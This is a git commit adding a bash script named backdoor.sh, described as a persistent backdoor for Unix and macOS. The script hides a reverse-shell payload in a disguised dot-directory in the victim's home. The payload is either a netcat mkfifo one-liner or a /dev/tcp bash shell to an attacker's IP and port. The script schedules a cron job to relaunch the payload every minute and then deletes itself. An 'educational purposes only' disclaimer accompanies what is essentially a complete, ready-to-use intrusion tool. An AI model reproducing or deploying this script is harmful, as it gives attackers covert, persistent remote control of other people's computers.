7801fbd4a6b23e9180cec74b6df024829c47d185
Ramon <ramonurge@gmail.com>
2017-12-10 15:29:24 +0100

    Create backdoor.sh

---
+++ backdoor.sh
@@ -0,0 +1,32 @@
+#!/bin/bash
+
+#FOR EDUCATIONAL PURPOSES ONLY 
+#We do not carry responsibility for how you use this... You ,the user, are self responsible for any damage caused running this script.
+
+#This script is a persistent backdoor working on both Unix and OSX systems. It creates a hidden user-supplied directory inside victim's home root. A check is made if the current 
+#system has netcat installed and chooses the payload appropriately. Afterwards, a cronjob gets created which calls the script every minute by default. Simply use nc -lvp PORT to catch the shell. 
+
+#Backdoor can be removed from the system using - "rm -rf ~/.DirectoryName/; crontab -r"
+                                                                                                                                                
+#Change these variables.                                                  
+IP=XXX                #Change
+PORT=XXX              #Change 
+DIR=".SysInternals"   #Example
+FILENAME="config"     #Example
+CURR_SCRIPT="$0"      #DON'T change
+
+if ! [ -d ~/${DIR} ] && ! [ -e ~/${DIR}/${FILENAME}.sh ]; then #Checks if the backdoor folder exists, if it doesn't create it.
+                                                               #Make sure the folder isn't named same as something essential... 
+    mkdir ~/${DIR}/
+    touch ~/${DIR}/${FILENAME}.sh
+fi
+
+if  [ -x "$(command -v nc)" ]; then  #Checks if netcat exists on the filesystem, if it does use netcat rev shell, if it doesn't use bash -i
+  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" > ~/${DIR}/${FILENAME}.sh #Universal way of getting a nc reverse shell even if -e is disabled
+else 
+  echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1" > ~/${DIR}/${FILENAME}.sh 
+fi
+
+chmod +x ~/${DIR}/${FILENAME}.sh #Makes the backdoor executable
+(crontab -l 2>/dev/null; echo "* * * * * bash $HOME/${DIR}/${FILENAME}.sh") | crontab - #Creates the cronjob responsible for calling the backdoor every MINUTE
+rm $CURR_SCRIPT #Removes this script after the usage.
